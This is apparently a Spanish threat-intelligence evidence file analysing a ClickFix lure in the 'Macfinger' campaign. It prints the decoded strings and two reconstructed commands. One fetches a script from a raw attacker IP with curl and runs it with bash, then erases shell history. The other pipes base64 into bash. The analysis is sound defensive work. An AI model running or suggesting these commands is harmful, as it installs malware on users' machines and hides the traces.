@@ -1,0 +1,59 @@
+EVIDENCIA: comando ClickFix reconstruido
+Campana Macfinger  ·  Intellroom Threat Intelligence  ·  2026-09-23  ·  TLP:CLEAR
+================================================================================
+
+METODO
+------
+El payload (ext-b.b96ad0785c08.js, 192.742 bytes) esta ofuscado con obfuscator.io
+(arreglo de cadenas rotado + base64 + RC4). Para resolverlo SIN ejecutar el payload:
+
+  1. Se extrajeron por analisis estatico SOLO tres piezas: la funcion del arreglo de
+     cadenas (_0x5272), la funcion decodificadora (_0x20df) y la IIFE de rotacion.
+  2. Se audito ese fragmento: cero ocurrencias de fetch, XMLHttpRequest, require,
+     import, document, window, navigator, localStorage, eval, Function, child_process
+     y process. Es puro manejo de cadenas.
+  3. Se ejecuto SOLO ese fragmento en Node v26.8.2 y se volcaron los indices
+     0x11a a 0x47a. Resultado: 423 cadenas legibles.
+  4. El cuerpo del payload NUNCA se ejecuto.
+
+FRAGMENTOS DECODIFICADOS RELEVANTES (indice -> valor)
+------------------------------------------------------
+  CRXLd  (literal en claro)  "echo 'I am not a robot - reCAPTCHA Verification ID: "
+  0x203                      http://45.131.215.56/8031e818c7a46?force=1
+  0x1ac                      '" -o '
+  0x25b                      ' && bash '
+  0x131                      "' && echo '"
+  0x2a9                      "' | base64 -D | bash"
+  0x1b4                      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+  0x125                      ") > /dev/null 2>&1 & clear; printf '\033[3J';
+                              history -d $(history 1 2>/dev/null | awk '{print $1}')
+                              2>/dev/null; fc -p /dev/null 2>/dev/null;
+                              printf '\n  \033[32m[check] Verification successful\033[0m\n\n'"
+  0x11d / 0x22f              'clipboard' / 'writeText'
+
+  Literal en el codigo, sin ofuscar:
+    '\x27\x20&&\x20(cd\x20/tmp\x20&&\x20curl\x20-kfsSL\x20\x22'
+    =  "' && (cd /tmp && curl -kfsSL \""
+
+  ID de verificacion falso: Math.floor(0x186a0 + Math.random()*0xdbba0)
+    =  entero aleatorio entre 100.000 y 999.999
+  Nombre del archivo temporal: '.' + 6 caracteres tomados al azar de 0x1b4
+
+COMANDO RECONSTRUIDO (variante con descarga)
+---------------------------------------------
+  echo 'I am not a robot - reCAPTCHA Verification ID: <6 digitos>' && (cd /tmp &&
+  curl -kfsSL "hxxp://45[.]131[.]215[.]56/8031e818c7a46?force=1" -o .<6 letras> &&
+  bash .<6 letras> && rm -f .<6 letras>) > /dev/null 2>&1 & clear;
+  printf '\033[3J';
+  history -d $(history 1 2>/dev/null | awk '{print $1}') 2>/dev/null;
+  fc -p /dev/null 2>/dev/null;
+  printf '\n  \033[32m[check] Verification successful\033[0m\n\n'
+
+COMANDO RECONSTRUIDO (variante autocontenida)
+----------------------------------------------
+  echo 'I am not a robot - reCAPTCHA Verification ID: <6 digitos>' && echo '<base64>'
+  | base64 -D | bash
+
+NOTA: base64 -D con D mayuscula es sintaxis de macOS. En GNU/Linux seria -d.
+La URL va defanged en este archivo. NO ejecutar ninguna de las dos lineas.
+================================================================================
